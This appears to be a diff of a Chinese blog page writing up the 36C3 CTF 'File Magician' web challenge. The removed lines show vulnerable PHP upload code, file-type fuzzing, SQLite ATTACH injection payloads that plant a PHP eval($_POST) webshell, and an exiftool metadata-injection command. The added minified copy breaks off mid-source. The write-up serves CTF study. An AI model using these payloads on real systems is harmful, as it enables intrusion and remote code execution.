@@ -1,185 +1,62 @@
-<!doctype html><html lang=en-us>
-<head><meta charset=utf-8>
-<meta name=viewport content="width=device-width,initial-scale=1">
-<link rel=manifest href=/manifest.json><meta name=description content="签到选手不请自来，经过了好几天的琢磨，终于把这次比赛的题目都弄得差不多了，这里记录一下本次比赛 Web 题目的解法。
-"><title>36c3 Web 学习记录</title>
-<link rel=canonical href=https://blog.zeddyu.info/2020/01/08/36c3-web/>
-<link rel=stylesheet href=/scss/style.min.css><meta property="og:title" content="36c3 Web 学习记录">
-<meta property="og:description" content="签到选手不请自来，经过了好几天的琢磨，终于把这次比赛的题目都弄得差不多了，这里记录一下本次比赛 Web 题目的解法。
-">
-<meta property="og:url" content="https://blog.zeddyu.info/2020/01/08/36c3-web/">
-<meta property="og:site_name" content="Zeddy's Blog">
-<meta property="og:type" content="article"><meta property="article:section" content="Posts"><meta property="article:tag" content="CTF"><meta property="article:published_time" content="2020-01-08T02:24:13+00:00"><meta property="article:modified_time" content="2020-01-08T02:24:13+00:00">
-<meta name=twitter:site content="@ZeddYu_Lu">
-<meta name=twitter:creator content="@ZeddYu_Lu"><meta name=twitter:title content="36c3 Web 学习记录">
-<meta name=twitter:description content="签到选手不请自来，经过了好几天的琢磨，终于把这次比赛的题目都弄得差不多了，这里记录一下本次比赛 Web 题目的解法。
-">
-<script async src="https://www.googletagmanager.com/gtag/js?id=G-PDESKL57LT"></script>
-<script>var doNotTrack=!1;if(!doNotTrack){window.dataLayer=window.dataLayer||[];function gtag(){dataLayer.push(arguments)}gtag('js',new Date),gtag('config','G-PDESKL57LT',{anonymize_ip:!1})}</script>
-</head>
-<body class="article-page has-toc">
-<script>(function(){const a='StackColorScheme';localStorage.getItem(a)||localStorage.setItem(a,"auto")})()</script><script>(function(){const b='StackColorScheme',a=localStorage.getItem(b),c=window.matchMedia('(prefers-color-scheme: dark)').matches===!0;a=='dark'||a==='auto'&&c?document.documentElement.dataset.scheme='dark':document.documentElement.dataset.scheme='light'})()</script>
-<div class="container main-container flex
-extended">
-<div id=article-toolbar>
-<a href=https://blog.zeddyu.info class=back-home><svg xmlns="http://www.w3.org/2000/svg" class="icon icon-tabler icon-tabler-chevron-left" width="24" height="24" viewBox="0 0 24 24" stroke-width="2" stroke="currentcolor" fill="none" stroke-linecap="round" stroke-linejoin="round"><path stroke="none" d="M0 0h24v24H0z"/><polyline points="15 6 9 12 15 18"/></svg>
-<span>Back</span>
-</a>
-</div>
-<main class="main full-width">
-<article class=main-article>
-<header class=article-header>
-<div class=article-details>
-<header class=article-category>
-<a href=/categories/CTF/ style=background-color:#ce0000;color:#fff>
-CTF
-</a>
-</header>
-<h2 class=article-title>
-<a href=/2020/01/08/36c3-web/>36c3 Web 学习记录</a>
-</h2>
-<footer class=article-time>
-<div><svg xmlns="http://www.w3.org/2000/svg" class="icon icon-tabler icon-tabler-calendar-time" width="56" height="56" viewBox="0 0 24 24" stroke-width="2" stroke="currentcolor" fill="none" stroke-linecap="round" stroke-linejoin="round"><path stroke="none" d="M0 0h24v24H0z"/><path d="M11.795 21H5a2 2 0 01-2-2V7a2 2 0 012-2h12a2 2 0 012 2v4"/><circle cx="18" cy="18" r="4"/><path d="M15 3v4"/><path d="M7 3v4"/><path d="M3 11h16"/><path d="M18 16.496V18l1 1"/></svg>
-<time class=article-time--published>Jan 08, 2020</time>
-</div>
-<div><svg xmlns="http://www.w3.org/2000/svg" class="icon icon-tabler icon-tabler-clock" width="24" height="24" viewBox="0 0 24 24" stroke-width="2" stroke="currentcolor" fill="none" stroke-linecap="round" stroke-linejoin="round"><path stroke="none" d="M0 0h24v24H0z"/><circle cx="12" cy="12" r="9"/><polyline points="12 7 12 12 15 15"/></svg>
-<time class=article-time--reading>
-14 minute read
-</time>
-</div>
-</footer>
-</div>
-</header>
-<section class=article-content>
-<p>签到选手不请自来，经过了好几天的琢磨，终于把这次比赛的题目都弄得差不多了，这里记录一下本次比赛 Web 题目的解法。</p>
-<p>如果师傅们有更好更有意思的解法，欢迎多多与菜鸡交流。非常感谢 @rebirth @wonderkun @wupco 等师傅在我学习本次比赛赛题时候不厌其烦地指导我。</p>
-<h2 id=file-magician>File Magician</h2>
-<blockquote>
-<p><strong>Difficulty estimate</strong>: easy</p>
-<p><strong>Solved</strong>:133/321</p>
-<p><strong>Points</strong>: round(1000 · min(1, 10 / (9 + [133 solves]))) = <strong>70</strong> points</p>
-<p><strong>Description:</strong></p>
-<p>Finally (again), a minimalistic, open-source file hosting solution.</p>
-<p><strong>Download:</strong></p>
-<p><a class=link href=https://github.com/ZeddYu/36c3-CTF-Web/blob/master/file%20magician/file%20magician-3ace41f3b0282a70.tar.xz target=_blank rel=noopener>file magician-3ace41f3b0282a70.tar.xz (2.1 KiB)</a></p>
-</blockquote>
-<p>算是 Web 当中的一个签到题，直接给出 Docker 文件源代码，我们可以在本地搭起来试试。</p>
-<div class=highlight><pre tabindex=0 class=chroma><code class=language-php data-lang=php><span class=o>&lt;?</span><span class=nx>php</span>
-<span class=nx>error_reporting</span><span class=p>(</span><span class=mi>0</span><span class=p>);</span>
-<span class=nx>ini_set</span><span class=p>(</span><span class=s1>&#39;display_errors&#39;</span><span class=p>,</span> <span class=mi>0</span><span class=p>);</span>
-<span class=nx>ini_set</span><span class=p>(</span><span class=s1>&#39;display_startup_errors&#39;</span><span class=p>,</span> <span class=mi>0</span><span class=p>);</span>
-<span class=nx>session_start</span><span class=p>();</span>
-
-<span class=k>if</span><span class=p>(</span> <span class=o>!</span> <span class=nx>isset</span><span class=p>(</span><span class=nv>$_SESSION</span><span class=p>[</span><span class=s1>&#39;id&#39;</span><span class=p>]))</span> <span class=p>{</span>
-    <span class=nv>$_SESSION</span><span class=p>[</span><span class=s1>&#39;id&#39;</span><span class=p>]</span> <span class=o>=</span> <span class=nx>bin2hex</span><span class=p>(</span><span class=nx>random_bytes</span><span class=p>(</span><span class=mi>32</span><span class=p>));</span>
-<span class=p>}</span>
-
-<span class=nv>$d</span> <span class=o>=</span> <span class=s1>&#39;/var/www/html/files/&#39;</span><span class=o>.</span><span class=nv>$_SESSION</span><span class=p>[</span><span class=s1>&#39;id&#39;</span><span class=p>]</span> <span class=o>.</span> <span class=s1>&#39;/&#39;</span><span class=p>;</span>
-<span class=o>@</span><span class=nx>mkdir</span><span class=p>(</span><span class=nv>$d</span><span class=p>,</span> <span class=mo>0700</span><span class=p>,</span> <span class=k>TRUE</span><span class=p>);</span>
-<span class=nx>chdir</span><span class=p>(</span><span class=nv>$d</span><span class=p>)</span> <span class=o>||</span> <span class=k>die</span><span class=p>(</span><span class=s1>&#39;chdir&#39;</span><span class=p>);</span>
-
-<span class=nv>$db</span> <span class=o>=</span> <span class=k>new</span> <span class=nx>PDO</span><span class=p>(</span><span class=s1>&#39;sqlite:&#39;</span> <span class=o>.</span> <span class=nv>$d</span> <span class=o>.</span> <span class=s1>&#39;db.sqlite3&#39;</span><span class=p>);</span>
-<span class=nv>$db</span><span class=o>-&gt;</span><span class=na>setAttribute</span><span class=p>(</span><span class=nx>PDO</span><span class=o>::</span><span class=na>ATTR_ERRMODE</span><span class=p>,</span> <span class=nx>PDO</span><span class=o>::</span><span class=na>ERRMODE_EXCEPTION</span><span class=p>);</span>
-<span class=nv>$db</span><span class=o>-&gt;</span><span class=na>exec</span><span class=p>(</span><span class=s1>&#39;CREATE TABLE IF NOT EXISTS upload(id INTEGER PRIMARY KEY, info TEXT);&#39;</span><span class=p>);</span>
-
-<span class=k>if</span> <span class=p>(</span><span class=nx>isset</span><span class=p>(</span><span class=nv>$_FILES</span><span class=p>[</span><span class=s1>&#39;file&#39;</span><span class=p>])</span> <span class=o>&amp;&amp;</span> <span class=nv>$_FILES</span><span class=p>[</span><span class=s1>&#39;file&#39;</span><span class=p>][</span><span class=s1>&#39;size&#39;</span><span class=p>]</span> <span class=o>&lt;</span> <span class=mi>10</span><span class=o>*</span><span class=mi>1024</span> <span class=p>){</span>
-    <span class=nv>$s</span> <span class=o>=</span> <span class=s2>&#34;INSERT INTO upload(info) VALUES (&#39;&#34;</span> <span class=o>.</span><span class=p>(</span><span class=k>new</span> <span class=nx>finfo</span><span class=p>)</span><span class=o>-&gt;</span><span class=na>file</span><span class=p>(</span><span class=nv>$_FILES</span><span class=p>[</span><span class=s1>&#39;file&#39;</span><span class=p>][</span><span class=s1>&#39;tmp_name&#39;</span><span class=p>])</span><span class=o>.</span> <span class=s2>&#34; &#39;);&#34;</span><span class=p>;</span>
-    <span class=nv>$db</span><span class=o>-&gt;</span><span class=na>exec</span><span class=p>(</span><span class=nv>$s</span><span class=p>);</span>
-    <span class=nx>move_uploaded_file</span><span class=p>(</span> <span class=nv>$_FILES</span><span class=p>[</span><span class=s1>&#39;file&#39;</span><span class=p>][</span><span class=s1>&#39;tmp_name&#39;</span><span class=p>],</span> <span class=nv>$d</span> <span class=o>.</span> <span class=nv>$db</span><span class=o>-&gt;</span><span class=na>lastInsertId</span><span class=p>())</span> <span class=o>||</span> <span class=k>die</span><span class=p>(</span><span class=s1>&#39;move_upload_file&#39;</span><span class=p>);</span>
-<span class=p>}</span>
-
-<span class=nv>$uploads</span> <span class=o>=</span> <span class=p>[];</span>
-<span class=nv>$sql</span> <span class=o>=</span> <span class=s1>&#39;SELECT * FROM upload&#39;</span><span class=p>;</span>
-<span class=k>foreach</span> <span class=p>(</span><span class=nv>$db</span><span class=o>-&gt;</span><span class=na>query</span><span class=p>(</span><span class=nv>$sql</span><span class=p>)</span> <span class=k>as</span> <span class=nv>$row</span><span class=p>)</span> <span class=p>{</span>
-    <span class=nv>$uploads</span><span class=p>[]</span> <span class=o>=</span> <span class=p>[</span><span class=nv>$row</span><span class=p>[</span><span class=s1>&#39;id&#39;</span><span class=p>],</span> <span class=nv>$row</span><span class=p>[</span><span class=s1>&#39;info&#39;</span><span class=p>]];</span>
-<span class=p>}</span>
-<span class=cp>?&gt;</span><span class=err>
-</span><span class=err>&lt;!doctype html&gt;
-</span><span class=err>&lt;html lang=&#34;en&#34;&gt;
-</span><span class=err>&lt;head&gt;
-</span><span class=err>    &lt;meta charset=&#34;utf-8&#34;&gt;
-</span><span class=err>    &lt;title&gt;file magician&lt;/title&gt;
-</span><span class=err>&lt;/head&gt;
-</span><span class=err>&lt;form enctype=&#34;multipart/form-data&#34; method=&#34;post&#34;&gt;
-</span><span class=err>    &lt;input type=&#34;file&#34; name=&#34;file&#34;&gt;
-</span><span class=err>    &lt;input type=&#34;submit&#34; value=&#34;upload&#34;&gt;
-</span><span class=err>&lt;/form&gt;
-</span><span class=err>&lt;table&gt;
-</span><span class=err>    &lt;?php foreach($uploads as $upload):?&gt;
-</span><span class=err>        &lt;tr&gt;
-</span><span class=err>            &lt;td&gt;&lt;a href=&#34;&lt;?= &#39;/files/&#39; . $_SESSION[&#39;id&#39;] . &#39;/&#39; . $upload[0] ?&gt;&#34;&gt;&lt;?= $upload[0] ?&gt;&lt;/a&gt;&lt;/td&gt;
-</span><span class=err>            &lt;td&gt;&lt;?= $upload[1] ?&gt;&lt;/td&gt;
-</span><span class=err>        &lt;/tr&gt;
-</span><span class=err>    &lt;?php endforeach?&gt;
-</span><span class=err>&lt;/table&gt;
-</span></code></pre></div><p>题目功能点就是一个简单的文件上传，然后在自己的 sandbox 当中看到自己的文件类型，文件类型是由<code>(new finfo)->file</code>来判断的，还使用了 sqlite 进行存储文件上传的记录。</p>
-<p>由于创建的数据库规定了 id 为自增长的整型主键，而且它使用了<code>lastInsertId()</code>返回最后一次 insert 数据的 id 作为文件名</p>
-<div class=highlight><pre tabindex=0 class=chroma><code class=language-php data-lang=php><span class=nx>move_uploaded_file</span><span class=p>(</span> <span class=nv>$_FILES</span><span class=p>[</span><span class=s1>&#39;file&#39;</span><span class=p>][</span><span class=s1>&#39;tmp_name&#39;</span><span class=p>],</span> <span class=nv>$d</span> <span class=o>.</span> <span class=nv>$db</span><span class=o>-&gt;</span><span class=na>lastInsertId</span><span class=p>())</span> <span class=o>||</span> <span class=k>die</span><span class=p>(</span><span class=s1>&#39;move_upload_file&#39;</span><span class=p>);</span>
-</code></pre></div><p>所以我们基本上可以不用考虑是否存在通过可控文件名上传文件 Getshell 的操作了。</p>
-<p>纵观整个文件，其实我们可以发现，我们可控制的输入点也只有在文件类型当中，文件类型又被拼入到了 sql 语句当中</p>
-<div class=highlight><pre tabindex=0 class=chroma><code class=language-php data-lang=php>    <span class=nv>$s</span> <span class=o>=</span> <span class=s2>&#34;INSERT INTO upload(info) VALUES (&#39;&#34;</span> <span class=o>.</span><span class=p>(</span><span class=k>new</span> <span class=nx>finfo</span><span class=p>)</span><span class=o>-&gt;</span><span class=na>file</span><span class=p>(</span><span class=nv>$_FILES</span><span class=p>[</span><span class=s1>&#39;file&#39;</span><span class=p>][</span><span class=s1>&#39;tmp_name&#39;</span><span class=p>])</span><span class=o>.</span> <span class=s2>&#34; &#39;);&#34;</span><span class=p>;</span>
-</code></pre></div><p>所以比较明显，我们只能通过这个来进行 sql 注入来进行一些操作了。</p>
-<p>我的思路就是 fuzz 一些特殊的文件，可能存在某些文件使用<code>finfo</code>得出来的结果含有单引号什么的，并且我们还能够插入可控数据，于是我就开始 fuzz 文件头，从<code>0x00</code>到<code>0xff0xff</code>。</p>
-<p>终于在<code>0x1f0x9d</code>得到一个文件类型是<code>compress'd data</code>，虽然有单引号，但是不存在我们可控的数据。</p>
-<p>还有一个是<code>0xfb0x01</code>得到一个文件类型是<code>QDOS object ''</code>，看起来很对的样子，有两个单引号，并且我们貌似可以在单引号之间插入数据，我们可以随便测试一下</p>
-<p><figure>
-<a href=https://zeddyuimg.oss-cn-shanghai.aliyuncs.com/20200106135242.png><img src=https://zeddyuimg.oss-cn-shanghai.aliyuncs.com/20200106135242.png loading=lazy>
-</a>
-</figure></p>
-<p>发现这里被吃掉了一个<code>p</code>，于是我们调整一下 payload 就可以用来注入了。</p>
-<p>sqlite 是可以用 .php 文件名来作为存储格式文件的，而且当前目录可写，于是我们就可以通过 sqlite attach 一个 z.php 的方法来写 shell 了。</p>
-<pre tabindex=0><code class=language-sqlite data-lang=sqlite>ATTACH DATABASE 'z.php' AS t;create TABLE t.e (d text);/*
-</code></pre><pre tabindex=0><code class=language-sqlite data-lang=sqlite>ATTACH DATABASE 'z.php' AS t;insert INTO t.e (d) VALUES ('&lt;?php eval($_POST[a])?&gt;');/*
-</code></pre><p>这里可能需要注意的就是有长度限制，所以我们需要分两次来写 shell</p>
-<p><figure>
-<a href=https://zeddyuimg.oss-cn-shanghai.aliyuncs.com/20200106135722.png><img src=https://zeddyuimg.oss-cn-shanghai.aliyuncs.com/20200106135722.png loading=lazy>
-</a>
-</figure></p>
-<h3 id=other-file>other file</h3>
-<p>看其他选手的公开的 wp 也是很有趣的一件事，然后从 ctftime 上公开的 wp，我们可以发现还存在着这么一些文件可以用来注入。</p>
-<h4 id=tex-dvi-file>TeX DVI file</h4>
-<p>0xf702 文件头，在填充一定数据后有我们完全可控的数据</p>
-<p><figure>
-<a href=https://zeddyuimg.oss-cn-shanghai.aliyuncs.com/20200106141314.png><img src=https://zeddyuimg.oss-cn-shanghai.aliyuncs.com/20200106141314.png loading=lazy>
-</a>
-</figure></p>
-<h4 id=jpeg>jpeg</h4>
-<p>在 jpeg 的 EXIF 数据段中有用来标识 software 的数据也是我们可控的地方，同样用来标识 comment 的地方我们也可控。于是我们可以使用 exiftool 来修改图片。</p>
-<div class=highlight><pre tabindex=0 class=chroma><code class=language-bash data-lang=bash>exiftool -overwrite_original -comment<span class=o>=</span><span class=s2>&#34;payload&#34;</span> -software<span class=o>=</span><span class=s2>&#34;payload2&#34;</span> 1.jpg
-</code></pre></div><p><figure>
-<a href=https://zeddyuimg.oss-cn-shanghai.aliyuncs.com/20200106142658.png><img src=https://zeddyuimg.oss-cn-shanghai.aliyuncs.com/20200106142658.png loading=lazy>
-</a>
-</figure></p>
-<h4 id=heading>#!</h4>
-<p>我们还可以利用<code>#!/</code>的文件来构造 payload</p>
-<p><figure>
-<a href=https://zeddyuimg.oss-cn-shanghai.aliyuncs.com/20200106143105.png><img src=https://zeddyuimg.oss-cn-shanghai.aliyuncs.com/20200106143105.png loading=lazy>
-</a>
-</figure></p>
-<h4 id=gz>gz</h4>
-<p>利用<code>gunzip</code>生成的 gz 文件，我们也可以用来注入，我们可控的数据是它的文件名</p>
-<p><figure>
-<a href=https://posts.xh4h.com/assets/images/36c3/gunzip1.png><img src=https://posts.xh4h.com/assets/images/36c3/gunzip1.png loading=lazy>
-</a>
-</figure></p>
-<p>当然我们也可以直接修改 gz 文件内容</p>
-<p><figure>
-<a href=https://zeddyuimg.oss-cn-shanghai.aliyuncs.com/20200106143647.png><img src=https://zeddyuimg.oss-cn-shanghai.aliyuncs.com/20200106143647.png loading=lazy>
-</a>
-</figure></p>
-<h2 id=writeupbin>WriteUpBin</h2>
-<blockquote>
-<p><strong>Difficulty estimate</strong>: medium</p>
-<p><strong>Solved</strong>:13/321</p>
-<p><strong>Points</strong>: round(1000 · min(1, 10 / (9 + [13 solves]))) = <strong>455</strong> points</p>
-<p><strong>Description:</strong></p>
-<p>Finally (again), a minimalistic, open-source social writeup hosting solution.</p>
-<p><strong>Download:</strong></p>
-<p><a class=link href=https://github.com/ZeddYu/36c3-CTF-Web/blob/master/writeupbin/WriteupBin-10b65573b511269f.tar.xz target=_blank rel=noopener>WriteupBin-10b65573b511269f.tar.xz</a></p>
-</blockquote>
-<p>一道比较有意思的侧信道题目，我们可以通过所给附件搭建形式知道，flag 存放在数据库当中，并且是在 admin 用户的第一条 writeup 数据的内容当中，题目提供简单的上传文本的功能，并且可以提交给 admin ，让 admin 给你点赞。</p>
-<p>项目结构如下：</p>
-<pre tabindex=0><code>.
+<!doctype html><html lang=en-us><head><meta charset=utf-8><meta name=viewport content="width=device-width,initial-scale=1"><link rel=manifest href=/manifest.json><meta name=description content="签到选手不请自来，经过了好几天的琢磨，终于把这次比赛的题目都弄得差不多了，这里记录一下本次比赛 Web 题目的解法。
+"><title>36c3 Web 学习记录</title><link rel=canonical href=https://blog.zeddyu.info/2020/01/08/36c3-web/><link rel=stylesheet href=/scss/style.min.css><meta property="og:title" content="36c3 Web 学习记录"><meta property="og:description" content="签到选手不请自来，经过了好几天的琢磨，终于把这次比赛的题目都弄得差不多了，这里记录一下本次比赛 Web 题目的解法。
+"><meta property="og:url" content="https://blog.zeddyu.info/2020/01/08/36c3-web/"><meta property="og:site_name" content="Zeddy's Blog"><meta property="og:type" content="article"><meta property="article:section" content="Posts"><meta property="article:tag" content="CTF"><meta property="article:published_time" content="2020-01-08T02:24:13+00:00"><meta property="article:modified_time" content="2020-01-08T02:24:13+00:00"><meta name=twitter:site content="@ZeddYu_Lu"><meta name=twitter:creator content="@ZeddYu_Lu"><meta name=twitter:title content="36c3 Web 学习记录"><meta name=twitter:description content="签到选手不请自来，经过了好几天的琢磨，终于把这次比赛的题目都弄得差不多了，这里记录一下本次比赛 Web 题目的解法。
+"><script async src="https://www.googletagmanager.com/gtag/js?id=G-PDESKL57LT"></script>
+<script>var doNotTrack=!1;if(!doNotTrack){window.dataLayer=window.dataLayer||[];function gtag(){dataLayer.push(arguments)}gtag("js",new Date),gtag("config","G-PDESKL57LT",{anonymize_ip:!1})}</script></head><body class="article-page has-toc"><script>(function(){const e="StackColorScheme";localStorage.getItem(e)||localStorage.setItem(e,"auto")})()</script><script>(function(){const t="StackColorScheme",e=localStorage.getItem(t),n=window.matchMedia("(prefers-color-scheme: dark)").matches===!0;e=="dark"||e==="auto"&&n?document.documentElement.dataset.scheme="dark":document.documentElement.dataset.scheme="light"})()</script><div class="container main-container flex
+extended"><div id=article-toolbar><a href=https://blog.zeddyu.info class=back-home><svg xmlns="http://www.w3.org/2000/svg" class="icon icon-tabler icon-tabler-chevron-left" width="24" height="24" viewBox="0 0 24 24" stroke-width="2" stroke="currentcolor" fill="none" stroke-linecap="round" stroke-linejoin="round"><path stroke="none" d="M0 0h24v24H0z"/><polyline points="15 6 9 12 15 18"/></svg><span>Back</span></a></div><main class="main full-width"><article class=main-article><header class=article-header><div class=article-details><header class=article-category><a href=/categories/CTF/ style=background-color:#ce0000;color:#fff>CTF</a></header><h2 class=article-title><a href=/2020/01/08/36c3-web/>36c3 Web 学习记录</a></h2><footer class=article-time><div><svg xmlns="http://www.w3.org/2000/svg" class="icon icon-tabler icon-tabler-calendar-time" width="56" height="56" viewBox="0 0 24 24" stroke-width="2" stroke="currentcolor" fill="none" stroke-linecap="round" stroke-linejoin="round"><path stroke="none" d="M0 0h24v24H0z"/><path d="M11.795 21H5a2 2 0 01-2-2V7a2 2 0 012-2h12a2 2 0 012 2v4"/><circle cx="18" cy="18" r="4"/><path d="M15 3v4"/><path d="M7 3v4"/><path d="M3 11h16"/><path d="M18 16.496V18l1 1"/></svg><time class=article-time--published>Jan 08, 2020</time></div><div><svg xmlns="http://www.w3.org/2000/svg" class="icon icon-tabler icon-tabler-clock" width="24" height="24" viewBox="0 0 24 24" stroke-width="2" stroke="currentcolor" fill="none" stroke-linecap="round" stroke-linejoin="round"><path stroke="none" d="M0 0h24v24H0z"/><circle cx="12" cy="12" r="9"/><polyline points="12 7 12 12 15 15"/></svg><time class=article-time--reading>14 minute read</time></div></footer></div></header><section class=article-content><p>签到选手不请自来，经过了好几天的琢磨，终于把这次比赛的题目都弄得差不多了，这里记录一下本次比赛 Web 题目的解法。</p><p>如果师傅们有更好更有意思的解法，欢迎多多与菜鸡交流。非常感谢 @rebirth @wonderkun @wupco 等师傅在我学习本次比赛赛题时候不厌其烦地指导我。</p><h2 id=file-magician>File Magician</h2><blockquote><p><strong>Difficulty estimate</strong>: easy</p><p><strong>Solved</strong>:133/321</p><p><strong>Points</strong>: round(1000 · min(1, 10 / (9 + [133 solves]))) = <strong>70</strong> points</p><p><strong>Description:</strong></p><p>Finally (again), a minimalistic, open-source file hosting solution.</p><p><strong>Download:</strong></p><p><a class=link href=https://github.com/ZeddYu/36c3-CTF-Web/blob/master/file%20magician/file%20magician-3ace41f3b0282a70.tar.xz target=_blank rel=noopener>file magician-3ace41f3b0282a70.tar.xz (2.1 KiB)</a></p></blockquote><p>算是 Web 当中的一个签到题，直接给出 Docker 文件源代码，我们可以在本地搭起来试试。</p><div class=highlight><pre tabindex=0 class=chroma><code class=language-php data-lang=php><span class=line><span class=cl><span class=o>&lt;?</span><span class=nx>php</span>
+</span></span><span class=line><span class=cl><span class=nx>error_reporting</span><span class=p>(</span><span class=mi>0</span><span class=p>);</span>
+</span></span><span class=line><span class=cl><span class=nx>ini_set</span><span class=p>(</span><span class=s1>&#39;display_errors&#39;</span><span class=p>,</span> <span class=mi>0</span><span class=p>);</span>
+</span></span><span class=line><span class=cl><span class=nx>ini_set</span><span class=p>(</span><span class=s1>&#39;display_startup_errors&#39;</span><span class=p>,</span> <span class=mi>0</span><span class=p>);</span>
+</span></span><span class=line><span class=cl><span class=nx>session_start</span><span class=p>();</span>
+</span></span><span class=line><span class=cl>
+</span></span><span class=line><span class=cl><span class=k>if</span><span class=p>(</span> <span class=o>!</span> <span class=nx>isset</span><span class=p>(</span><span class=nv>$_SESSION</span><span class=p>[</span><span class=s1>&#39;id&#39;</span><span class=p>]))</span> <span class=p>{</span>
+</span></span><span class=line><span class=cl>    <span class=nv>$_SESSION</span><span class=p>[</span><span class=s1>&#39;id&#39;</span><span class=p>]</span> <span class=o>=</span> <span class=nx>bin2hex</span><span class=p>(</span><span class=nx>random_bytes</span><span class=p>(</span><span class=mi>32</span><span class=p>));</span>
+</span></span><span class=line><span class=cl><span class=p>}</span>
+</span></span><span class=line><span class=cl>
+</span></span><span class=line><span class=cl><span class=nv>$d</span> <span class=o>=</span> <span class=s1>&#39;/var/www/html/files/&#39;</span><span class=o>.</span><span class=nv>$_SESSION</span><span class=p>[</span><span class=s1>&#39;id&#39;</span><span class=p>]</span> <span class=o>.</span> <span class=s1>&#39;/&#39;</span><span class=p>;</span>
+</span></span><span class=line><span class=cl><span class=o>@</span><span class=nx>mkdir</span><span class=p>(</span><span class=nv>$d</span><span class=p>,</span> <span class=mo>0700</span><span class=p>,</span> <span class=k>TRUE</span><span class=p>);</span>
+</span></span><span class=line><span class=cl><span class=nx>chdir</span><span class=p>(</span><span class=nv>$d</span><span class=p>)</span> <span class=o>||</span> <span class=k>die</span><span class=p>(</span><span class=s1>&#39;chdir&#39;</span><span class=p>);</span>
+</span></span><span class=line><span class=cl>
+</span></span><span class=line><span class=cl><span class=nv>$db</span> <span class=o>=</span> <span class=k>new</span> <span class=nx>PDO</span><span class=p>(</span><span class=s1>&#39;sqlite:&#39;</span> <span class=o>.</span> <span class=nv>$d</span> <span class=o>.</span> <span class=s1>&#39;db.sqlite3&#39;</span><span class=p>);</span>
+</span></span><span class=line><span class=cl><span class=nv>$db</span><span class=o>-&gt;</span><span class=na>setAttribute</span><span class=p>(</span><span class=nx>PDO</span><span class=o>::</span><span class=na>ATTR_ERRMODE</span><span class=p>,</span> <span class=nx>PDO</span><span class=o>::</span><span class=na>ERRMODE_EXCEPTION</span><span class=p>);</span>
+</span></span><span class=line><span class=cl><span class=nv>$db</span><span class=o>-&gt;</span><span class=na>exec</span><span class=p>(</span><span class=s1>&#39;CREATE TABLE IF NOT EXISTS upload(id INTEGER PRIMARY KEY, info TEXT);&#39;</span><span class=p>);</span>
+</span></span><span class=line><span class=cl>
+</span></span><span class=line><span class=cl><span class=k>if</span> <span class=p>(</span><span class=nx>isset</span><span class=p>(</span><span class=nv>$_FILES</span><span class=p>[</span><span class=s1>&#39;file&#39;</span><span class=p>])</span> <span class=o>&amp;&amp;</span> <span class=nv>$_FILES</span><span class=p>[</span><span class=s1>&#39;file&#39;</span><span class=p>][</span><span class=s1>&#39;size&#39;</span><span class=p>]</span> <span class=o>&lt;</span> <span class=mi>10</span><span class=o>*</span><span class=mi>1024</span> <span class=p>){</span>
+</span></span><span class=line><span class=cl>    <span class=nv>$s</span> <span class=o>=</span> <span class=s2>&#34;INSERT INTO upload(info) VALUES (&#39;&#34;</span> <span class=o>.</span><span class=p>(</span><span class=k>new</span> <span class=nx>finfo</span><span class=p>)</span><span class=o>-&gt;</span><span class=na>file</span><span class=p>(</span><span class=nv>$_FILES</span><span class=p>[</span><span class=s1>&#39;file&#39;</span><span class=p>][</span><span class=s1>&#39;tmp_name&#39;</span><span class=p>])</span><span class=o>.</span> <span class=s2>&#34; &#39;);&#34;</span><span class=p>;</span>
+</span></span><span class=line><span class=cl>    <span class=nv>$db</span><span class=o>-&gt;</span><span class=na>exec</span><span class=p>(</span><span class=nv>$s</span><span class=p>);</span>
+</span></span><span class=line><span class=cl>    <span class=nx>move_uploaded_file</span><span class=p>(</span> <span class=nv>$_FILES</span><span class=p>[</span><span class=s1>&#39;file&#39;</span><span class=p>][</span><span class=s1>&#39;tmp_name&#39;</span><span class=p>],</span> <span class=nv>$d</span> <span class=o>.</span> <span class=nv>$db</span><span class=o>-&gt;</span><span class=na>lastInsertId</span><span class=p>())</span> <span class=o>||</span> <span class=k>die</span><span class=p>(</span><span class=s1>&#39;move_upload_file&#39;</span><span class=p>);</span>
+</span></span><span class=line><span class=cl><span class=p>}</span>
+</span></span><span class=line><span class=cl>
+</span></span><span class=line><span class=cl><span class=nv>$uploads</span> <span class=o>=</span> <span class=p>[];</span>
+</span></span><span class=line><span class=cl><span class=nv>$sql</span> <span class=o>=</span> <span class=s1>&#39;SELECT * FROM upload&#39;</span><span class=p>;</span>
+</span></span><span class=line><span class=cl><span class=k>foreach</span> <span class=p>(</span><span class=nv>$db</span><span class=o>-&gt;</span><span class=na>query</span><span class=p>(</span><span class=nv>$sql</span><span class=p>)</span> <span class=k>as</span> <span class=nv>$row</span><span class=p>)</span> <span class=p>{</span>
+</span></span><span class=line><span class=cl>    <span class=nv>$uploads</span><span class=p>[]</span> <span class=o>=</span> <span class=p>[</span><span class=nv>$row</span><span class=p>[</span><span class=s1>&#39;id&#39;</span><span class=p>],</span> <span class=nv>$row</span><span class=p>[</span><span class=s1>&#39;info&#39;</span><span class=p>]];</span>
+</span></span><span class=line><span class=cl><span class=p>}</span>
+</span></span><span class=line><span class=cl><span class=cp>?&gt;</span><span class=err>
+</span></span></span><span class=line><span class=cl><span class=err>&lt;!doctype html&gt;
+</span></span></span><span class=line><span class=cl><span class=err>&lt;html lang=&#34;en&#34;&gt;
+</span></span></span><span class=line><span class=cl><span class=err>&lt;head&gt;
+</span></span></span><span class=line><span class=cl><span class=err>    &lt;meta charset=&#34;utf-8&#34;&gt;
+</span></span></span><span class=line><span class=cl><span class=err>    &lt;title&gt;file magician&lt;/title&gt;
+</span></span></span><span class=line><span class=cl><span class=err>&lt;/head&gt;
+</span></span></span><span class=line><span class=cl><span class=err>&lt;form enctype=&#34;multipart/form-data&#34; method=&#34;post&#34;&gt;
+</span></span></span><span class=line><span class=cl><span class=err>    &lt;input type=&#34;file&#34; name=&#34;file&#34;&gt;
+</span></span></span><span class=line><span class=cl><span class=err>    &lt;input type=&#34;submit&#34; value=&#34;upload&#34;&gt;
+</span></span></span><span class=line><span class=cl><span class=err>&lt;/form&gt;
+</span></span></span><span class=line><span class=cl><span class=err>&lt;table&gt;
+</span></span></span><span class=line><span class=cl><span class=err>    &lt;?php foreach($uploads as $upload):?&gt;
+</span></span></span><span class=line><span class=cl><span class=err>        &lt;tr&gt;
+</span></span></span><span class=line><span class=cl><span class=err>            &lt;td&gt;&lt;a href=&#34;&lt;?= &#39;/files/&#39; . $_SESSION[&#39;id&#39;] . &#39;/&#39; . $upload[0] ?&gt;&#34;&gt;&lt;?= $upload[0] ?&gt;&lt;/a&gt;&lt;/td&gt;
